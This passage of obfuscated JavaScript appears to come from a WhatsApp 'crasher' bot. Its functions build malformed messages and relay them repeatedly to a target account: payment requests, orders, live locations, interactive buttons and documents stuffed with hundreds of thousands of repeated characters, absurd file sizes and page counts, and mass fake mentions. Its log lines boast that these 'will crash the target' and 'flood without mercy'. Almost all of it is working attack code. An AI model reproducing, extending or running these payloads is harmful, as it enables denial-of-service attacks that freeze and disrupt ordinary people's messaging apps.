        currencyCodeIso4217: "T-Ryuichi ~ NeverDie",
        amount1000: "9999999",
        noteMessage: {},
        expiryTimestamp: "0",
        amount: {},
        background: {}
      };
      _0x1e71b7.noteMessage.stickerMessage = {};
      _0x1e71b7.noteMessage.stickerMessage.url = "https://mmg.whatsapp.net/v/t62.15575-24/25379495_1233047614391746_7167397995027803975_n.enc?ccb=11-4&oh=01_Q5AaIAD-TDkmUl78ym4RtDRuW8UYO9L-2_eD_nZ4GJ8t4avr&oe=66F0DBAB&_nc_sid=5e03e0&mms3=true";
      _0x1e71b7.noteMessage.stickerMessage.fileSha256 = "AsFkxvyLnK222nsY5s6MhoF4NSKwRg7ViAI5nTcPKUs=";
      _0x1e71b7.noteMessage.stickerMessage.fileEncSha256 = "72VMs7G12NGe7VQ2xJ25sNemjAPsdhITdgyvHgrQmdM=";
      _0x1e71b7.noteMessage.stickerMessage.mediaKey = "1yHvOqdtF1xEwpPnudsJInh09EBqrJWEZcDma7K6ORo=";
      _0x1e71b7.noteMessage.stickerMessage.mimetype = "image/webp";
      _0x1e71b7.noteMessage.stickerMessage.height = 64;
      _0x1e71b7.noteMessage.stickerMessage.width = 64;
      _0x1e71b7.noteMessage.stickerMessage.directPath = "/v/t62.15575-24/25379495_1233047614391746_7167397995027803975_n.enc?ccb=11-4&oh=01_Q5AaIAD-TDkmUl78ym4RtDRuW8UYO9L-2_eD_nZ4GJ8t4avr&oe=66F0DBAB&_nc_sid=5e03e0";
      _0x1e71b7.noteMessage.stickerMessage.fileLength = "253140";
      _0x1e71b7.noteMessage.stickerMessage.mediaKeyTimestamp = "1724474267";
      _0x1e71b7.noteMessage.stickerMessage.firstFrameLength = 15246;
      _0x1e71b7.noteMessage.stickerMessage.firstFrameSidecar = "N4MITqGgH587+A==";
      _0x1e71b7.noteMessage.stickerMessage.isAnimated = true;
      _0x1e71b7.noteMessage.stickerMessage.stickerSentTs = "1724474267588";
      _0x1e71b7.noteMessage.stickerMessage.isAvatar = false;
      _0x1e71b7.noteMessage.stickerMessage.isAiSticker = false;
      _0x1e71b7.noteMessage.stickerMessage.isLottie = false;
      _0x1e71b7.noteMessage.stickerMessage.contextInfo = {};
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.isForwarded = true;
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.fromMe = false;
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.participant = "0@s.whatsapp.net";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.remoteJid = _0x21f0d9.chat;
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage = {};
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.externalAdReply = {};
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.forwardedNewsletterMessageInfo = {};
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage = {};
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.url = "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.mimetype = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.fileSha256 = "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.fileLength = "9999999999999";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.pageCount = 1316134911;
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.mediaKey = "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.fileName = " ⭑𝕯𝖊𝓥 𝖔𝖗𝖘𝖎𝖃 ▻ # 𝖢𝗋𝖺𝗌𝗁 Vcard :)";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.fileEncSha256 = "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.directPath = "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.mediaKeyTimestamp = "1724474503";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.contactVcard = true;
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.thumbnailDirectPath = "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.thumbnailSha256 = "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.thumbnailEncSha256 = "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.quotedMessage.documentMessage.jpegThumbnail = "";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.externalAdReply.title = "x devorsixcore x";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.externalAdReply.mediaType = "VIDEO";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.externalAdReply.sourceUrl = "https://lol.devorsixcore.ml/crashcombine";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.forwardedNewsletterMessageInfo.newsletterJid = "120989263814683954@newsletter";
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.forwardedNewsletterMessageInfo.serverMessageId = 1;
      _0x1e71b7.noteMessage.stickerMessage.contextInfo.forwardedNewsletterMessageInfo.newsletterName = " # ";
      _0x1e71b7.amount.value = "999999999";
      _0x1e71b7.amount.offset = 999999999;
      _0x1e71b7.amount.currencyCode = "CRASHCODE9741";
      _0x1e71b7.background.id = "100";
      _0x1e71b7.background.fileLength = "928283";
      _0x1e71b7.background.width = 1000;
      _0x1e71b7.background.height = 1000;
      _0x1e71b7.background.mimetype = "stay withme - devorsixcore";
      _0x1e71b7.background.placeholderArgb = 4278190080;
      _0x1e71b7.background.textArgb = 4294967295;
      _0x1e71b7.background.subtextArgb = 4278190080;
      const _0xc89f4f = {
        requestPaymentMessage: _0x1e71b7
      };
      await _0x4b53e5.relayMessage(_0x2d7d7f, _0xc89f4f, {});
      console.log(_0x3e6b4d.yellow(" Chucky Bugs : Actived! "));
    }
    async function _0x2573db(_0x3ae7d1) {
      let _0x30e558 = generateWAMessageFromContent(_0x3ae7d1, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              messageSecret: randomBytes(32)
            },
            eventMessage: {
              isCanceled: false,
              name: "̶R̶y̶u̶i̶h̶i ̶T̶r̶a̶s̶h",
              description: "\0",
              location: {
                degreesLatitude: "0",
                degreesLongitude: "0",
                name: "ϟ TRASH SYSTEM ~ \0" + "ꦾ".repeat(90000)
              },
              joinLink: "https://wa.me/settings",
              startTime: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: _0x3ae7d1
      });
      await _0x4b53e5.relayMessage(_0x3ae7d1, _0x30e558.message, {
        participant: {
          jid: _0x3ae7d1
        }
      });
      console.log(_0x3e6b4d.green(" Chucky Bugs : Actived ! "));
    }
    async function _0x266e07(_0x58e2c0) {
      let _0xbdc90a = generateWAMessageFromContent(_0x58e2c0, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: " Ryuichi~NeverDie ",
              degreesLongitude: " Stay With Me - Christmas Crasher",
              caption: "TRASH LOCK ~ RYUICHI\0" + "ꦾ".repeat(90000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x58e2c0,
        quoted: QBug
      });
      await _0x4b53e5.relayMessage(_0x58e2c0, _0xbdc90a.message, {
        participant: {
          jid: _0x58e2c0
        }
      });
      console.log(_0x3e6b4d.red.bold(" Chucky Bugs : Actived ! "));
    }
    async function _0x319ca0(_0x4e0634, _0xdf6fe9) {
      var _0x39a200 = generateWAMessageFromContent(_0x4e0634, proto.Message.fromObject({
        orderMessage: {
          orderId: "CRASHCODE9471",
          thumbnail: "",
          itemCount: 999999999,
          status: "DECLINED",
          surface: "CATALOG",
          message: "DAMN !" + "ꦾ".repeat(50000) + "@1".repeat(103000),
          orderTitle: "INFINITY",
          sellerJid: "1@s.whatsapp.net",
          token: "AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
          totalAmount1000: "100000019492000",
          totalCurrencyCode: "IDR",
          messageVersion: 2
        }
      }), {
        userJid: _0x4e0634,
        quoted: _0xdf6fe9
      });
      await _0x4b53e5.relayMessage(_0x4e0634, _0x39a200.message, {
        participant: {
          jid: _0x4e0634
        },
        messageId: _0x39a200.key.id
      });
      console.log(_0x3e6b4d.white.bold(" Catalog Trash ! "));
    }
    async function _0x3e3244(_0x5f266f, _0x57aedc) {
      const _0x192412 = {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "CALL ME 𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕" + "ꦾ".repeat(120000) + "@1".repeat(250000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      };
      await _0x4b53e5.relayMessage(_0x5f266f, _0x192412, {
        participant: {
          jid: _0x5f266f
        },
        messageId: null
      });
      console.log("Location Message Sent!");
      await new Promise(_0x254b98 => setTimeout(_0x254b98, 2000));
      const _0x626835 = {
        orderId: "CRASHCODE9471",
        thumbnail: "",
        itemCount: 999999999,
        status: "DECLINED",
        surface: "CATALOG",
        message: "DAMN !" + "ꦾ".repeat(50000) + "@1".repeat(90000),
        orderTitle: "INFINITY",
        sellerJid: "1@s.whatsapp.net",
        token: "AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
        totalAmount1000: "\0",
        totalCurrencyCode: "IDR",
        messageVersion: 2
      };
      const _0x3ea442 = {
        orderMessage: _0x626835
      };
      const _0x301266 = proto.Message.fromObject(_0x3ea442);
      const _0x50b268 = generateWAMessageFromContent(_0x5f266f, _0x301266, {
        userJid: _0x5f266f,
        quoted: _0x57aedc
      });
      await _0x4b53e5.relayMessage(_0x5f266f, _0x50b268.message, {
        participant: {
          jid: _0x5f266f
        },
        messageId: _0x50b268.key.id
      });
      console.log("Order Message Sent!");
    }
    async function _0x404112(_0x4fb3ee) {
      const _0xc0eabc = [{
        text: "HELLO" + "ꦾ".repeat(120000) + "@1".repeat(250000),
        groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
      }, {
        text: "MY NAME IS" + "ꦾ".repeat(50000) + "@1".repeat(90000),
        groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
      }, {
        text: "Christmas Crusher" + "ꦾ".repeat(120000) + "@1".repeat(250000),
        groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
      }, {
        text: "RYUICHI" + "ꦾ".repeat(300000),
        groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
      }];
      for (let _0x104fc1 = 0; _0x104fc1 < _0xc0eabc.length; _0x104fc1++) {
        const _0x3ef0cd = {
          text: _0xc0eabc[_0x104fc1].text
        };
        const _0x4fa5f6 = {
          groupJid: "1@newsletter",
          groupSubject: _0xc0eabc[_0x104fc1].groupSubject
        };
        const _0x4df472 = {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0
                  },
                  hasMediaAttachment: true
                },
                body: _0x3ef0cd,
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: Array.from({
                    length: 10
                  }, () => "1@newsletter"),
                  groupMentions: [_0x4fa5f6]
                }
              }
            }
          }
        };
        await _0x4b53e5.relayMessage(_0x4fb3ee, _0x4df472, {
          participant: {
            jid: _0x4fb3ee
          },
          messageId: null
        });
        console.log("Location Trash " + (_0x104fc1 + 1) + " Sent!");
        if (_0x104fc1 < _0xc0eabc.length - 1) {
          await new Promise(_0xe20cde => setTimeout(_0xe20cde, 2000));
        }
      }
    }
    async function _0x4e998c(_0x507716) {
      let _0x24af00 = generateWAMessageFromContent(_0x507716, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            listResponseMessage: {
              title: "@chuckychristmascrasher\0" + "ꦾ".repeat(50000) + "@1".repeat(103000),
              listType: 1,
              singleSelectReply: {
                selectedRowId: "id"
              },
              contextInfo: {
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "1@newsletter",
                  serverMessageId: 1,
                  newsletterName: "WANNA BE YOURS"
                }
              },
              description: " Ryuichi Trasher "
            }
          }
        }
      }), {
        userJid: _0x507716,
        quoted: QBug
      });
      await _0x4b53e5.relayMessage(_0x507716, _0x24af00.message, {
        participant: {
          jid: _0x507716
        }
      });
      console.log(_0x3e6b4d.red("Sending Crasher : True"));
    }
    async function _0x12c92f(_0x4378af, _0x104a79) {
      var _0x296213 = generateWAMessageFromContent(_0x4378af, proto.Message.fromObject({
        documentMessage: {
          title: "Яyuichi",
          fileName: "InfinitYTrasH.js",
          mimetype: "application/pdf",
          url: "",
          fileSha256: "",
          mediaKey: "",
          fileLength: 123456,
          jpegThumbnail: ""
        },
        extendedTextMessage: {
          text: "𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕" + "ꦾ".repeat(103000) + "https://wa.me/c/2348108778025",
          matchedText: "https://wa.me/c/2348108778025",
          description: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕..." + "ꦾ".repeat(20000),
          title: "Яyuichi",
          previewType: "NONE",
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }), {
        userJid: _0x4378af,
        quoted: _0x104a79
      });
      await _0x4b53e5.relayMessage(_0x4378af, _0x296213.message, {
        participant: {
          jid: _0x4378af
        },
        messageId: _0x296213.key.id
      });
    }
    async function _0x5489e3(_0xd3b156) {
      for (let _0x3e7112 = 0; _0x3e7112 < 10; _0x3e7112++) {
        await _0x404112(_0xd3b156);
        await _0x149690(_0xd3b156);
        await _0x8c2c8e(_0xd3b156);
        await _0x113b89(_0xd3b156);
        await _0x495699(_0xd3b156);
        await _0x30106a(_0xd3b156);
        await _0x61f4c5(_0xd3b156);
        await _0x4e998c(_0xd3b156);
        await _0x58cb40(_0xd3b156);
        await _0x58cb40(_0xd3b156);
        await _0x113b89(_0xd3b156);
        await _0x8c2c8e(_0xd3b156);
        await _0x149690(_0xd3b156);
        await _0x495699(_0xd3b156);
      }
      console.log(_0x3e6b4d.yellow.bold("Floods Ravage Without Mercy – The Reckoning Begins!"));
    }
    async function _0x409402(_0x17520d) {
      for (let _0x283484 = 0; _0x283484 < 10; _0x283484++) {
        await _0x404112(_0x17520d);
        await _0x149690(_0x17520d);
        await _0x8c2c8e(_0x17520d);
        await _0x317d69(_0x17520d);
        await _0x30106a(_0x17520d);
        await _0x61f4c5(_0x17520d);
        await _0x4e998c(_0x17520d);
        await _0x58cb40(_0x17520d);
        await _0x2ae636(_0x17520d);
        await _0x113b89(_0x17520d);
        await _0x495699(_0x17520d);
        await _0x4330db(_0x17520d);
        await _0x47cb93(_0x17520d);
        await _0x113b89(_0x17520d);
        await _0x8c2c8e(_0x17520d);
        await _0x149690(_0x17520d);
        await _0x4330db(_0x17520d);
        await _0x30106a(_0x17520d);
        await _0x61f4c5(_0x17520d);
        await _0x4e998c(_0x17520d);
        await _0x58cb40(_0x17520d);
        await _0x495699(_0x17520d);
        await _0x2e3112(_0x17520d);
        await _0x3941b8(_0x17520d);
        await _0x27dc9a(_0x17520d);
        await _0x495699(_0x17520d);
      }
    }
    async function _0x240e14(_0x3a5180) {
      for (let _0x4efb8b = 0; _0x4efb8b < 10; _0x4efb8b++) {
        await _0x404112(_0x3a5180);
        await _0x12cc93(_0x3a5180);
        await _0x113b89(_0x3a5180);
        await _0x12cc93(_0x3a5180);
        await _0x149690(_0x3a5180);
        await _0x12cc93(_0x3a5180);
        await _0x495699(_0x3a5180);
        await _0x12cc93(_0x3a5180);
      }
      console.log(_0x3e6b4d.green("Specter Call Active: This Call Shall Unleash a Deadly Delay!"));
    }
    async function _0xb7d158(_0x256959) {
      for (let _0xb34fc9 = 0; _0xb34fc9 < 10; _0xb34fc9++) {
        await _0x404112(_0x256959);
        await _0x495699(_0x256959);
        await _0x30106a(_0x256959);
        await _0x61f4c5(_0x256959);
        await _0x4e998c(_0x256959);
        await _0x58cb40(_0x256959);
        await _0x149690(_0x256959);
        await _0x317d69(_0x256959);
        await _0x8c2c8e(_0x256959);
        await _0x2ae636(_0x256959);
        await _0x495699(_0x256959);
        await _0x2e3112(_0x256959);
        await _0x113b89(_0x256959);
        await _0x3941b8(_0x256959);
        await _0x8c2c8e(_0x256959);
        await _0x27dc9a(_0x256959);
        await _0x149690(_0x256959);
        await _0x495699(_0x256959);
      }
      console.log(_0x3e6b4d.blue.bold("Phantom Location and Forged Documents Activated: The Target Will Be Frozen in Time!"));
    }
    async function _0x57306a(_0x276829) {
      for (let _0x438927 = 0; _0x438927 < 10; _0x438927++) {
        await _0x404112(_0x276829);
        await _0x2ee745(_0x276829, true);
        await _0x2bd409(_0x276829);
        await _0x30106a(_0x276829);
        await _0x61f4c5(_0x276829);
        await _0x4e998c(_0x276829);
        await _0x58cb40(_0x276829);
        await _0x47ee2c(_0x276829);
        await _0xc02c5b(_0x276829);
        await _0x391ba7(_0x276829);
        await _0x4e84cb(_0x276829);
        await _0x4330db(_0x276829);
        await _0x47cb93(_0x276829);
        await _0x495699(_0x276829);
        await _0x113b89(_0x276829);
        await _0x8c2c8e(_0x276829);
        await _0x149690(_0x276829);
        await _0x30106a(_0x276829);
        await _0x61f4c5(_0x276829);
        await _0x4e998c(_0x276829);
        await _0x58cb40(_0x276829);
        await _0x149690(_0x276829);
        await _0x8c2c8e(_0x276829);
        await _0x113b89(_0x276829);
        await _0x495699(_0x276829);
      }
      console.log(_0x3e6b4d.yellow.bold("Fake Location Activated: The Target Will Be Frozen in Darkness!"));
    }
    async function _0x28179c(_0x5272d0) {
      for (let _0x22de7b = 0; _0x22de7b < 10; _0x22de7b++) {
        await _0x404112(_0x5272d0);
        await _0x317d69(_0x5272d0);
        await _0x96020a(500);
        await _0x2ae636(_0x5272d0);
        await _0x30106a(_0x5272d0);
        await _0x61f4c5(_0x5272d0);
        await _0x4e998c(_0x5272d0);
        await _0x58cb40(_0x5272d0);
        await _0x96020a(500);
        await _0x2e3112(_0x5272d0);
        await _0x96020a(500);
        await _0x3941b8(_0x5272d0);
        await _0x30106a(_0x5272d0);
        await _0x61f4c5(_0x5272d0);
        await _0x4e998c(_0x5272d0);
        await _0x58cb40(_0x5272d0);
        await _0x96020a(500);
        await _0x27dc9a(_0x5272d0);
      }
      console.log(_0x3e6b4d.green("Illusive Document Triggered: The Target Will Collapse in an Instant!"));
    }
    async function _0x3ade30(_0x8c3f5d) {
      for (let _0x4cf4ee = 0; _0x4cf4ee < 15; _0x4cf4ee++) {
        await _0x237fbd(_0x8c3f5d, true);
        await _0x5aef34(_0x8c3f5d);
        await _0x17cbaa(_0x8c3f5d);
        await _0x5de1b1(_0x8c3f5d);
        await _0xf0edb0(_0x8c3f5d);
        await _0x130828(_0x8c3f5d);
        await _0x1991c0(_0x8c3f5d);
        await _0x1f5af1(_0x8c3f5d);
        await _0xac6776(_0x8c3f5d);
        await _0x3cb5ce(_0x8c3f5d);
        await _0x237fbd(_0x8c3f5d, true);
        await _0x5aef34(_0x8c3f5d);
      }
      console.log(_0x3e6b4d.red.bold("Invisible Message Is Active: This Will Crash The Target!"));
    }
    async function _0x26fc86(_0x11aca4, _0x23cb54, _0x397c0e = false, _0x634027 = false) {
      let _0x517df2 = generateWAMessageFromContent(_0x11aca4, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: _0x23cb54
                },
                hasMediaAttachment: true
              },
              body: {
                text: "‎⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ \",\"body\":\"xxx\"}",
                buttons: [_0x397c0e ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_info",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_info",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\",\"sections\":[{\"title\":\"⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x11aca4,
        quoted: EsQl
      });
      await _0x4b53e5.relayMessage(_0x11aca4, _0x517df2.message, _0x634027 ? {
        participant: {
          jid: _0x11aca4
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑"));
    }
    async function _0x4e6f90(_0x154e78, _0x3065ad, _0x1a8614 = false, _0x57cd0f = false) {
      let _0x17135f = generateWAMessageFromContent(_0x154e78, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🩸⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡🦠",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: _0x3065ad
                },
                hasMediaAttachment: true
              },
              body: {
                text: "‎⭑̤▾ ⿻ 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑 ⿻ ▾⭑̤"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" A NEW ERA ϟ \",\"body\":\"xxx\"}",
                buttons: [_0x1a8614 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_info",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_info",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡😈\",\"sections\":[{\"title\":\"A NEW ERA ϟ\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x154e78,
        quoted: VisiX
      });
